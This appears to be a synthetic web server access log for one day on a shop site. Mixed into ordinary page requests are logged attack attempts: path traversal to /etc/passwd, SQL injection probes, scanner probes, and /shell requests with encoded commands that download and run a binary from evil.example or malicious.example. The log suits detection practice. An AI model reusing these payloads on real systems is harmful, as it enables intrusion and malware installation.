203.0.113.11 - - [21/May/2026:16:27:13 +0000] "GET /about HTTP/1.1" 200 3617 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:10:57:47 +0000] "GET /api/v1/status HTTP/1.1" 200 1871 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:08:33:36 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 3866 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:14:06:36 +0000] "GET /cart HTTP/1.1" 200 3897 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.155.205.33 - - [21/May/2026:17:39:00 +0000] "GET /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 500 60 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
185.220.101.45 - - [21/May/2026:19:53:51 +0000] "GET /phpmyadmin HTTP/1.1" 404 102 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
10.0.0.23 - - [21/May/2026:14:21:41 +0000] "GET /contact HTTP/1.1" 200 7510 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.12 - - [21/May/2026:09:28:03 +0000] "GET / HTTP/1.1" 200 6760 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.77 - - [21/May/2026:13:45:45 +0000] "POST /xmlrpc.php HTTP/1.1" 404 600 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:11:04:08 +0000] "GET /about HTTP/1.1" 200 2558 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:11:09:21 +0000] "GET / HTTP/1.1" 200 6907 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:14:50:26 +0000] "GET /products HTTP/1.1" 200 5426 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:10:28:47 +0000] "GET /api/v1/status HTTP/1.1" 200 4075 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:14:21:35 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 3433 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:10:49:22 +0000] "GET /about HTTP/1.1" 200 2906 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:09:09:24 +0000] "GET /products HTTP/1.1" 200 4557 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:13:36:49 +0000] "GET /db.sql HTTP/1.1" 404 335 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:18:09:04 +0000] "GET /api/v1/status HTTP/1.1" 200 8852 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.44 - - [21/May/2026:17:43:58 +0000] "POST /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 200 558 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:20:05:54 +0000] "GET /search?q=laptop HTTP/1.1" 404 834 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [21/May/2026:16:56:18 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 6845 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.11 - - [21/May/2026:11:44:02 +0000] "GET / HTTP/1.1" 200 8675 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [21/May/2026:18:37:19 +0000] "GET /about HTTP/1.1" 200 870 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.77 - - [21/May/2026:18:12:44 +0000] "GET /wp-login.php HTTP/1.1" 403 420 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
91.240.118.172 - - [21/May/2026:08:13:58 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 403 800 "-" "ffuf/2.1.0"
10.0.0.23 - - [21/May/2026:19:48:39 +0000] "GET / HTTP/1.1" 200 8384 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.155.205.33 - - [21/May/2026:17:00:21 +0000] "GET /phpMyAdmin HTTP/1.1" 404 307 "-" "Hydra"
172.16.0.45 - - [21/May/2026:08:13:19 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:08:22:06 +0000] "GET /products HTTP/1.1" 200 5688 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:15:45:31 +0000] "GET /static/js/app.js HTTP/1.1" 200 6994 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:12:37:25 +0000] "GET /cart HTTP/1.1" 200 3245 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.13 - - [21/May/2026:12:21:43 +0000] "GET / HTTP/1.1" 200 5121 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:13:38:08 +0000] "GET /products/12 HTTP/1.1" 200 6194 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.46 - - [21/May/2026:10:52:59 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 403 761 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.46 - - [21/May/2026:15:51:24 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 403 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.155.205.33 - - [21/May/2026:09:43:34 +0000] "GET /admin/login HTTP/1.1" 403 546 "-" "ffuf/2.1.0"
192.168.1.13 - - [21/May/2026:11:57:59 +0000] "GET /products/43 HTTP/1.1" 200 2474 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:14:33:39 +0000] "GET /index.html HTTP/1.1" 200 3732 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.77 - - [21/May/2026:19:57:22 +0000] "POST /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 200 1411 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:17:13:02 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 4098 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:13:55:30 +0000] "GET /search?q=laptop HTTP/1.1" 200 2643 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:08:23:06 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 8800 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:11:09:46 +0000] "GET /static/css/style.css HTTP/1.1" 200 7013 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:19:14:05 +0000] "GET /static/img/logo.png HTTP/1.1" 200 6624 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:19:02:36 +0000] "GET /cart HTTP/1.1" 200 2647 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:10:46:00 +0000] "GET /backup.zip HTTP/1.1" 403 764 "-" "gobuster/3.6"
192.168.1.13 - - [21/May/2026:16:34:39 +0000] "GET /products HTTP/1.1" 200 4730 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:10:20:36 +0000] "GET /search?q=laptop HTTP/1.1" 200 7183 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:12:31:17 +0000] "GET /static/js/app.js HTTP/1.1" 200 4371 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.12 - - [21/May/2026:11:42:27 +0000] "GET /search?q=phone HTTP/1.1" 200 3367 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.44 - - [21/May/2026:09:38:42 +0000] "GET /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 200 4599 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:17:38:21 +0000] "GET /checkout HTTP/1.1" 200 2287 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.44 - - [21/May/2026:19:48:55 +0000] "GET /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 403 1045 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.155.205.33 - - [21/May/2026:16:09:48 +0000] "HEAD /xmlrpc.php HTTP/1.1" 403 764 "-" "ffuf/2.1.0"
185.220.101.45 - - [21/May/2026:15:41:35 +0000] "POST /login HTTP/1.1" 404 571 "-" "WPScan v3.8.25"
172.16.0.45 - - [21/May/2026:12:11:43 +0000] "GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1" 403 1029 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:15:51:59 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 6270 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:15:30:57 +0000] "GET /static/css/style.css HTTP/1.1" 200 5523 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:13:49:28 +0000] "GET /checkout HTTP/1.1" 200 1468 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:16:28:06 +0000] "GET /products/43 HTTP/1.1" 200 4734 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.11 - - [21/May/2026:17:19:32 +0000] "GET /search?q=phone HTTP/1.1" 200 2231 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
185.220.101.45 - - [21/May/2026:09:09:06 +0000] "GET /administrator HTTP/1.1" 403 298 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
10.0.0.22 - - [21/May/2026:16:46:08 +0000] "GET /checkout HTTP/1.1" 200 4770 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.45 - - [21/May/2026:13:23:40 +0000] "POST /shell?cd%2B/tmp%3Bwget%2Bhttp%3A//malicious.example/bin%3Bchmod%2B777%2Bbin%3B./bin HTTP/1.1" 403 845 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:11:35:47 +0000] "GET /about HTTP/1.1" 200 8479 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:19:03:34 +0000] "GET /about HTTP/1.1" 200 8516 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.46 - - [21/May/2026:14:16:49 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:14:32:33 +0000] "GET /api/v1/status HTTP/1.1" 404 842 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.77 - - [21/May/2026:19:40:12 +0000] "GET /phpmyadmin HTTP/1.1" 403 129 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:20:02:52 +0000] "GET /search?q=phone HTTP/1.1" 302 231 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.23 - - [21/May/2026:14:41:38 +0000] "GET /products/12 HTTP/1.1" 200 3293 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.79 - - [21/May/2026:08:17:01 +0000] "GET /wp-admin/ HTTP/1.1" 403 438 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:15:11:15 +0000] "GET /products/43 HTTP/1.1" 200 6576 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:17:52:53 +0000] "GET /cart HTTP/1.1" 200 1890 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:12:48:49 +0000] "GET /api/v1/status HTTP/1.1" 200 4011 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:11:39:00 +0000] "GET /search?q=phone HTTP/1.1" 200 6406 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
91.240.118.172 - - [21/May/2026:18:31:12 +0000] "GET /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 404 557 "-" "gobuster/3.6"
198.51.100.77 - - [21/May/2026:12:22:10 +0000] "POST /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 200 1637 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:10:15:51 +0000] "GET /contact HTTP/1.1" 200 1370 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:18:20:06 +0000] "GET /checkout HTTP/1.1" 200 948 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:17:09:29 +0000] "GET /products/43 HTTP/1.1" 200 3883 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:18:20:23 +0000] "GET /cart HTTP/1.1" 200 3207 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:18:53:06 +0000] "GET /api/v1/status HTTP/1.1" 200 8854 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:08:48:15 +0000] "GET /static/css/style.css HTTP/1.1" 200 2426 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
91.240.118.172 - - [21/May/2026:16:43:52 +0000] "POST /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 404 1199 "-" "Skipfish/2.10b"
203.0.113.10 - - [21/May/2026:15:34:42 +0000] "GET /products/12 HTTP/1.1" 200 5851 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:08:34:56 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 8666 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:14:08:00 +0000] "GET /search?q=phone HTTP/1.1" 200 8574 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:16:01:21 +0000] "GET /products HTTP/1.1" 200 6760 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:12:16:50 +0000] "GET /products HTTP/1.1" 200 4041 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.78 - - [21/May/2026:14:14:38 +0000] "GET /wp-login.php HTTP/1.1" 500 26 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.77 - - [21/May/2026:09:33:37 +0000] "GET /.git/config HTTP/1.1" 403 1091 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:19:33:39 +0000] "GET /checkout HTTP/1.1" 200 5100 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:19:59:36 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 3648 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.79 - - [21/May/2026:08:36:29 +0000] "GET /config.php HTTP/1.1" 404 1126 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:13:40:34 +0000] "GET /cart HTTP/1.1" 200 8572 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:16:10:55 +0000] "GET /products/12 HTTP/1.1" 200 7690 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:10:23:37 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 1813 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:11:35:54 +0000] "GET /static/js/app.js HTTP/1.1" 200 3147 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:10:37:57 +0000] "GET /index.html HTTP/1.1" 200 4565 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.12 - - [21/May/2026:08:13:37 +0000] "GET /products/43 HTTP/1.1" 200 8467 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:20:06:30 +0000] "GET /api/v1/status HTTP/1.1" 200 3262 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:09:21:01 +0000] "GET /products HTTP/1.1" 200 8404 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:13:58:04 +0000] "GET /api/v1/status HTTP/1.1" 302 590 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:17:10:01 +0000] "GET /cart HTTP/1.1" 200 4686 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:12:27:13 +0000] "GET /api/v1/status HTTP/1.1" 200 4044 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:17:15:30 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 3615 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.155.205.33 - - [21/May/2026:15:43:22 +0000] "POST /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 361 "-" "WPScan v3.8.25"
192.168.1.13 - - [21/May/2026:19:24:09 +0000] "GET /static/css/style.css HTTP/1.1" 200 1447 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:14:34:09 +0000] "GET /static/img/logo.png HTTP/1.1" 200 4570 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:09:17:19 +0000] "GET /static/js/app.js HTTP/1.1" 200 7088 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:10:57:20 +0000] "GET /checkout HTTP/1.1" 200 3651 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:12:54:46 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 4783 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:13:54:37 +0000] "GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1" 403 566 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
